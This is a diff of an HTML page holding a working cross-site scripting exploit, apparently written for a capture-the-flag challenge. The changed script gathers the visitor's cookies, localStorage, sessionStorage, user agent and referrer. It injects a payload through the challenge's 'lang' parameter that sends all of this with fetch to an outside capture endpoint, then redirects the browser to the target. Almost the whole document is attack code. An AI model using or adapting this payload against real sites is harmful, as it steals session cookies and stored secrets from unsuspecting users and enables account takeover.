@@ -2,9 +2,35 @@
 <html>
   <body>
     <script>
-      // XSS payload: will cause chal2 to send its location.href to your API endpoint
-      var xss = '";fetch(\'https://ssrf-eta.vercel.app/api/capture?href=\'+encodeURIComponent(location.href));//';
-      // Redirect to chal2 with the XSS payload in the lang param
+      // Build a data object with as much as possible
+      let data = {
+        href: location.href,
+        cookie: document.cookie,
+        localStorage: {},
+        sessionStorage: {},
+        userAgent: navigator.userAgent,
+        referrer: document.referrer
+      };
+      // Copy all localStorage keys and values
+      for (let i = 0; i < localStorage.length; i++) {
+        let key = localStorage.key(i);
+        data.localStorage[key] = localStorage.getItem(key);
+      }
+      // Copy all sessionStorage keys and values
+      for (let i = 0; i < sessionStorage.length; i++) {
+        let key = sessionStorage.key(i);
+        data.sessionStorage[key] = sessionStorage.getItem(key);
+      }
+      // Build the XSS payload for chal2
+      let xss = '";fetch(`https://ssrf-eta.vercel.app/api/capture?data=${encodeURIComponent(JSON.stringify({' +
+        'href:location.href,' +
+        'cookie:document.cookie,' +
+        'ls:Object.assign({},localStorage),' +
+        'ss:Object.assign({},sessionStorage),' +
+        'ua:navigator.userAgent,' +
+        'rf:document.referrer' +
+        '}))}`);//';
+      // Actually redirect to chal2 with this payload in the lang param
       location.href = 'http://chal2.lagncra.sh:8426/?lang=' + encodeURIComponent(xss);
     </script>
   </body>
